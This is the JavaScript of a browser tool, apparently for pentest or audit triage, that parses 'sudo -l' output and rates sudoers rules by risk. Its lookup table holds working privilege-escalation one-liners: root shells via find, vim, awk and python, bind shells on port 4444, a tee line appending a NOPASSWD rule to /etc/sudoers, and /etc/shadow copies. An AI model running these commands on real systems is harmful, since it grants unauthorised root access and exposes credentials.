(function () {
  'use strict';

  /* ── Curated GTFOBins entries with a `sudo` function ──────────────────── */
  // Keys are basenames; payload is the canonical sudo invocation from
  // gtfobins.github.io. Anything not in this table is linked out at render
  // time so the operator can still verify manually.
  const GTFOBINS = {
    'find':       { payload: 'sudo find . -exec /bin/sh \\; -quit' },
    'vim':        { payload: 'sudo vim -c \':!/bin/sh\'' },
    'vi':         { payload: 'sudo vi -c \':!/bin/sh\'' },
    'nano':       { payload: 'sudo nano  (then ^R ^X, then "reset; sh 1>&0 2>&0")' },
    'less':       { payload: 'sudo less /etc/profile  (then !/bin/sh)' },
    'more':       { payload: 'sudo more /etc/profile  (then !/bin/sh)' },
    'man':        { payload: 'sudo man man  (then !/bin/sh)' },
    'awk':        { payload: 'sudo awk \'BEGIN {system("/bin/sh")}\'' },
    'gawk':       { payload: 'sudo gawk \'BEGIN {system("/bin/sh")}\'' },
    'sed':        { payload: 'sudo sed -n \'1e exec sh 1>&0\' /etc/hosts' },
    'env':        { payload: 'sudo env /bin/sh' },
    'python':     { payload: 'sudo python -c \'import os; os.system("/bin/sh")\'' },
    'python2':    { payload: 'sudo python2 -c \'import os; os.system("/bin/sh")\'' },
    'python3':    { payload: 'sudo python3 -c \'import os; os.system("/bin/sh")\'' },
    'perl':       { payload: 'sudo perl -e \'exec "/bin/sh";\'' },
    'ruby':       { payload: 'sudo ruby -e \'exec "/bin/sh"\'' },
    'node':       { payload: 'sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})\'' },
    'php':        { payload: 'sudo php -r "pcntl_exec(\'/bin/sh\');"' },
    'lua':        { payload: 'sudo lua -e \'os.execute("/bin/sh")\'' },
    'tar':        { payload: 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh' },
    'zip':        { payload: 'sudo zip /tmp/x.zip /etc/hosts -T -TT \'sh #\'' },
    'unzip':      { payload: 'No direct shell payload; can read or overwrite arbitrary files via -d / -o.', notes: 'Useful for arbitrary write.' },
    'tee':        { payload: 'echo "user ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers', notes: 'Append a permissive rule to /etc/sudoers.' },
    'cp':         { payload: 'sudo cp /tmp/myshell /bin/ls  (or read SUID binaries)', notes: 'Stage SUID binaries or overwrite system tools.' },
    'mv':         { payload: 'sudo mv /tmp/myshell /usr/local/bin/passwd  (overwrite system binaries)' },
    'dd':         { payload: 'sudo dd if=/etc/shadow of=/tmp/shadow  (or write any file as root)' },
    'chmod':      { payload: 'sudo chmod u+s /bin/bash  (then bash -p)', notes: 'Make any binary SUID-root.' },
    'chown':      { payload: 'sudo chown $(id -u):$(id -g) /etc/shadow', notes: 'Reassign ownership of any file.' },
    'install':    { payload: 'sudo install -m =xs $(which bash) .  (then ./bash -p)', notes: 'Install a binary with the SUID bit set.' },
    'make':       { payload: 'sudo make -s --eval=$\'x:\\n\\t-\'"/bin/sh"', notes: 'Run a command via an inline Makefile rule.' },
    'gdb':        { payload: 'sudo gdb -nx -ex \'!/bin/sh\' -ex quit' },
    'nmap':       { payload: 'sudo nmap --interactive  (then !sh)', notes: 'Only works with very old nmap (<5.21); newer versions lack --interactive.' },
    'socat':      { payload: 'sudo socat exec:/bin/sh,pty,setsid,setpgid,stderr,ctty tcp-listen:4444' },
    'ncat':       { payload: 'sudo ncat -lvp 4444 -e /bin/sh' },
    'nc':         { payload: 'sudo nc -lvp 4444 -e /bin/sh', notes: '-e support is disabled in most distro builds; mileage will vary.' },
    'ssh':        { payload: 'sudo ssh -o ProxyCommand=";/bin/sh 0<&2 1>&2" x' },
    'scp':        { payload: 'sudo scp -S /bin/sh x y:', notes: 'Uses -S to substitute the transport program.' },
    'rsync':      { payload: 'sudo rsync -e \'sh -c "/bin/sh 0<&2 1>&2"\' 127.0.0.1:/dev/null' },
    'git':        { payload: 'sudo git -p help config  (then !/bin/sh)', notes: 'Via the pager; PAGER=less or PAGER=more.' },
    'mount':      { payload: 'sudo mount -o bind /bin/sh /bin/mount  (impl-dependent)', notes: 'Depends on which mount implementation is in use; older util-linux paths only.' },
    'umount':     { payload: 'sudo umount -O ,nouser /tmp/x', notes: 'Limited; mostly arbitrary file read on certain implementations.' },
    'apt':        { payload: 'sudo apt changelog <pkg>  (then !/bin/sh)', notes: 'Via the apt pager.' },
    'apt-get':    { payload: 'sudo apt-get changelog <pkg>  (then !/bin/sh)' },
    'dpkg':       { payload: 'sudo dpkg -l  (then !/bin/sh in pager)' },
    'yum':        { payload: 'sudo yum localinstall -y /tmp/evil.rpm', notes: 'RPM post-install scriptlets run as root.' },
    'dnf':        { payload: 'sudo dnf install -y /tmp/evil.rpm', notes: 'RPM post-install scriptlets run as root.' },
    'journalctl': { payload: 'sudo journalctl  (then !/bin/sh)' },
    'systemctl':  { payload: 'sudo systemctl status  (then !/bin/sh)' },
    'pkexec':     { payload: 'sudo pkexec /bin/sh' },
    'cpulimit':   { payload: 'sudo cpulimit -l 100 -f -- /bin/sh' },
    'wget':       { payload: 'sudo wget --use-askpass=/bin/sh 0', notes: 'Spawns /bin/sh via the askpass helper.' },
    'curl':       { payload: 'sudo curl file:///etc/shadow', notes: 'Arbitrary file read; does not directly spawn a shell.' },
  };

  const SHELL_BASENAMES = new Set(['sh','bash','dash','ksh','zsh','tcsh','csh','fish','su','rbash']);

  const DANGEROUS_ENV_VARS = new Set([
    'LD_PRELOAD','LD_LIBRARY_PATH','LD_AUDIT',
    'PYTHONPATH','PYTHONUSERBASE','PERL5LIB','PERLLIB','RUBYLIB','RUBYOPT',
    'BASH_ENV','ENV','GIT_EXTERNAL_DIFF','GIT_PAGER',
  ]);

  /* ── Parser ───────────────────────────────────────────────────────────── */
  function parseSudo(raw) {
    const text = raw.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
    const lines = text.split('\n');

    const result = {
      user: null,
      host: null,
      defaults: [],
      rules: [],
    };
    let mode = null;

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      const t = line.trim();
      if (!t) continue;

      const userM = t.match(/^User\s+(\S+)\s+may run the following commands(?:\s+on\s+(\S+?))?\s*:?\s*$/i);
      if (userM) {
        result.user = userM[1];
        if (userM[2]) result.host = userM[2];
        mode = 'rules';
        continue;
      }

      if (/^Matching Defaults entries/i.test(t) ||
          /^Runas and Command-specific defaults/i.test(t)) {
        mode = 'defaults';
        continue;
      }

      if (mode === 'defaults') {
        for (const piece of t.split(/,\s+/)) {
          const p = piece.trim();
          if (p) result.defaults.push(p);
        }
        continue;
      }

      if (mode === 'rules') {
        const ruleM = t.match(/^\(([^)]+)\)\s*(.*)$/);
        if (!ruleM) continue;
        const runas = ruleM[1].trim();
        let rest = ruleM[2].trim();

        const tags = [];
        while (true) {
          const tagM = rest.match(/^([A-Z]+):\s*/);
          if (!tagM) break;
          tags.push(tagM[1]);
          rest = rest.slice(tagM[0].length);
        }

        const commands = rest.split(/,\s+/).map(c => c.trim()).filter(Boolean);
        for (const cmd of commands) {
          const isNeg = cmd.startsWith('!');
          const cleanCmd = (isNeg ? cmd.slice(1) : cmd).trim();
          const isAll = /^ALL$/i.test(cleanCmd);
          const firstTok = cleanCmd.split(/\s+/)[0] || '';
          const basename = isAll ? 'ALL' : firstTok.split('/').pop();
          const hasWildcard = !isAll && /\*|\?|\[/.test(cleanCmd);
          result.rules.push({
            runas, tags,
            command: cleanCmd,
            basename, isAll, isNeg, hasWildcard,
          });
        }
      }
    }

    return result;
  }

  /* ── Classification ──────────────────────────────────────────────────── */
  function classifyDefault(d) {
    // env_keep += "LD_PRELOAD" or env_keep+="LD_PRELOAD" or env_keep+="A B"
    const keepM = d.match(/^env_keep\s*\+?=\s*"([^"]*)"$/i) || d.match(/^env_keep\s*\+?=\s*(\S+)$/i);
    if (keepM) {
      const vars = keepM[1].split(/\s+/).filter(Boolean);
      const dangerous = vars.filter(v => DANGEROUS_ENV_VARS.has(v.replace(/^[+-]/, '')));
      if (dangerous.length) {
        return {
          sev: 'crit',
          title: `env_keep preserves ${dangerous.join(', ')}`,
          note: 'A dangerous env var crosses the sudo boundary — load arbitrary code into any sudo-run binary that is dynamically linked, an interpreter, or a shell.',
        };
      }
      return null;
    }
    if (/^!requiretty\b/i.test(d)) {
      return { sev: 'info', title: '!requiretty', note: 'No TTY required — useful for non-interactive sudo invocations.' };
    }
    if (/^!authenticate\b/i.test(d)) {
      return { sev: 'high', title: '!authenticate', note: 'Authentication globally disabled for sudo — every rule is effectively NOPASSWD.' };
    }
    if (/^targetpw\b/i.test(d)) {
      return { sev: 'info', title: 'targetpw', note: 'Target user\'s password is required to invoke sudo (rather than the invoker\'s).' };
    }
    return null;
  }

  function classifyRule(r) {
    if (r.isNeg) {
      return [{ sev: 'info', title: 'Excluded command', note: `Negation rule — ${r.command} is explicitly excluded from a broader rule above.` }];
    }

    const findings = [];
    const nopasswd = r.tags.includes('NOPASSWD');
    const setenv = r.tags.includes('SETENV');
    const pwSuffix = nopasswd ? ' without a password' : '';
    const runasSuffix = `as ${r.runas}`;

    if (r.isAll) {
      findings.push({
        sev: 'crit',
        title: 'Unrestricted sudo (ALL)',
        note: `Permission to run any command ${runasSuffix}${pwSuffix} — trivial root.`,
      });
      return findings;
    }

    if (SHELL_BASENAMES.has(r.basename)) {
      findings.push({
        sev: 'crit',
        title: `Direct shell: ${r.basename}`,
        note: `Run ${r.basename} ${runasSuffix}${pwSuffix} — trivial root shell.`,
      });
    } else {
      const gtfo = GTFOBINS[r.basename];
      if (gtfo) {
        findings.push({
          sev: 'crit',
          title: `GTFOBins: ${r.basename}`,
          note: gtfo.payload + (gtfo.notes ? ' — ' + gtfo.notes : ''),
        });
      } else if (r.basename && r.basename !== 'ALL') {
        const url = `https://gtfobins.github.io/gtfobins/${encodeURIComponent(r.basename)}/`;
        findings.push({
          sev: 'info',
          title: `Unknown binary: ${r.basename}`,
          html: `Not in the curated set. Check <a href="${url}" target="_blank" rel="noopener">${escapeHtml(url)}</a> manually.`,
        });
      }
    }

    if (r.hasWildcard) {
      findings.push({
        sev: 'high',
        title: 'Wildcard in command',
        note: 'A wildcard in the sudoers entry can enable argument smuggling — the invoker may inject extra arguments or paths to escape the intended scope.',
      });
    }

    if (setenv) {
      findings.push({
        sev: 'high',
        title: 'SETENV tag',
        note: 'The user controls the environment for this command — LD_PRELOAD / PYTHONPATH / etc. abuse is in scope even when env_reset is the default.',
      });
    }

    if (nopasswd) {
      findings.push({
        sev: 'info',
        title: 'NOPASSWD',
        note: 'No password prompt — this rule fires the moment sudo is invoked.',
      });
    }

    return findings;
  }

  function topSev(findings) {
    if (findings.some(f => f.sev === 'crit')) return 'crit';
    if (findings.some(f => f.sev === 'high')) return 'high';
    return 'info';
  }

  function sevRank(sev) { return sev === 'crit' ? 3 : sev === 'high' ? 2 : sev === 'info' ? 1 : 0; }

  /* ── Render helpers ───────────────────────────────────────────────────── */
  function escapeHtml(s) {
    return String(s == null ? '' : s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }
  const h = escapeHtml;

  function badge(sev) {
    const label = sev === 'crit' ? 'CRITICAL' : sev === 'high' ? 'HIGH' : 'INFO';
    return `<span class="badge b-${sev}">${label}</span>`;
  }

  function renderFinding(f) {
    return `<div class="finding sev-${f.sev}">
      <div class="finding-head">
        <span class="finding-name">${h(f.title)}</span>${badge(f.sev)}
      </div>
      <div class="finding-note">${f.html ? f.html : h(f.note || '')}</div>
    </div>`;
  }

  function renderHeader(parsed) {
    if (!parsed.user) return '';
    const bits = [`<span class="user-name mono">${h(parsed.user)}</span>`];
    if (parsed.host) bits.push(`<span class="user-host mono">@ ${h(parsed.host)}</span>`);
    return `<div class="card">
      <div class="card-title">User</div>
      <div class="card-inner"><div class="user-row">${bits.join(' ')}</div></div>
    </div>`;
  }

  function renderDefaults(parsed) {
    if (!parsed.defaults.length) return '';
    const flagged = parsed.defaults
      .map(d => ({ d, c: classifyDefault(d) }))
      .filter(x => x.c)
      .sort((a, b) => sevRank(b.c.sev) - sevRank(a.c.sev));
    if (!flagged.length) return '';
    return `<div class="card">
      <div class="card-title">Defaults</div>
      <div class="card-inner">${flagged.map(({ c }) => renderFinding(c)).join('')}</div>
    </div>`;
  }

  function renderRules(parsed) {
    if (!parsed.rules.length) return '';
    const enriched = parsed.rules.map(r => ({ r, findings: classifyRule(r) }));
    enriched.sort((a, b) => sevRank(topSev(b.findings)) - sevRank(topSev(a.findings)));

    const cards = enriched.map(({ r, findings }) => {
      const sev = topSev(findings);
      const tagBadges = r.tags.map(t => `<span class="tag-badge tag-${t.toLowerCase()}">${h(t)}</span>`).join('');
      return `<div class="card rule sev-${sev}">
        <div class="rule-head">
          <span class="rule-runas mono">(${h(r.runas)})</span>
          ${tagBadges}
          <span class="rule-cmd mono">${r.isAll ? '<em>ALL</em>' : h(r.command)}</span>
          ${r.isNeg ? '<span class="rule-neg">excluded</span>' : ''}
        </div>
        <div class="rule-body">${findings.map(renderFinding).join('')}</div>
      </div>`;
    });

    return `<div class="card">
      <div class="card-title">Rules <span class="card-count">${parsed.rules.length}</span></div>
      <div class="card-inner rules-inner">${cards.join('')}</div>
    </div>`;
  }

  /* ── Main actions ─────────────────────────────────────────────────────── */
  const inp   = document.getElementById('inp');
  const errEl = document.getElementById('err');
  const sumEl = document.getElementById('summary');
  const outEl = document.getElementById('out');

  function showError(msg) {
    errEl.textContent = msg;
    errEl.classList.remove('hidden');
    sumEl.classList.add('hidden');
    outEl.innerHTML = '';
  }

  function parse() {
    const raw = inp.value.trim();
    errEl.classList.add('hidden');

    if (!raw) {
      showError('Please paste sudo -l output above.');
      return;
    }

    const parsed = parseSudo(raw);
    if (!parsed.user && !parsed.rules.length && !parsed.defaults.length) {
      showError('No sudo -l content recognised. Make sure you pasted the full output, including the "User ... may run the following commands" line.');
      return;
    }

    let nCrit = 0, nHigh = 0, nInfo = 0, nUnknown = 0;
    for (const d of parsed.defaults) {
      const c = classifyDefault(d);
      if (c) { if (c.sev === 'crit') nCrit++; else if (c.sev === 'high') nHigh++; else nInfo++; }
    }
    for (const r of parsed.rules) {
      const fs = classifyRule(r);
      for (const f of fs) {
        if (f.sev === 'crit') nCrit++;
        else if (f.sev === 'high') nHigh++;
        else if (f.sev === 'info') nInfo++;
        if (/^Unknown binary/.test(f.title)) nUnknown++;
      }
    }

    sumEl.innerHTML = `
      <div class="stat"><span class="stat-n ${nCrit?'red':'green'}">${nCrit}</span><span class="stat-l">critical</span></div>
      <div class="stat"><span class="stat-n ${nHigh?'orange':'green'}">${nHigh}</span><span class="stat-l">high</span></div>
      <div class="stat"><span class="stat-n ${nInfo?'blue':'green'}">${nInfo}</span><span class="stat-l">informational</span></div>
      <div class="summary-note">${parsed.rules.length} rule${parsed.rules.length===1?'':'s'}${nUnknown ? `, ${nUnknown} unknown binary — check GTFOBins manually` : ''}</div>`;
    sumEl.classList.remove('hidden');

    outEl.innerHTML = `<div class="cards">
      ${renderHeader(parsed)}
      ${renderDefaults(parsed)}
      ${renderRules(parsed)}
    </div>`;
  }

  function clearAll() {
    inp.value = '';
    outEl.innerHTML = '';
    errEl.classList.add('hidden');
    sumEl.classList.add('hidden');
  }

  const SAMPLE = `Matching Defaults entries for jsmith on web-01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+="LD_PRELOAD"

User jsmith may run the following commands on web-01:
    (root) NOPASSWD: /usr/bin/find
    (root) /usr/bin/vim /etc/hosts
    (ALL) NOPASSWD: /usr/bin/less /var/log/syslog
    (root) NOPASSWD: /usr/bin/tar -czf /backups/* /var/www
    (www-data) /usr/local/bin/restart-app.sh
    (ALL : ALL) SETENV: /usr/bin/python3 /opt/scripts/healthcheck.py
    (root) /usr/sbin/iptables-save`;

  function loadSample() {
    inp.value = SAMPLE;
    parse();
  }

  document.getElementById('parseBtn').addEventListener('click', parse);
  document.getElementById('sampleBtn').addEventListener('click', loadSample);
  document.getElementById('clearBtn').addEventListener('click', clearAll);
})();
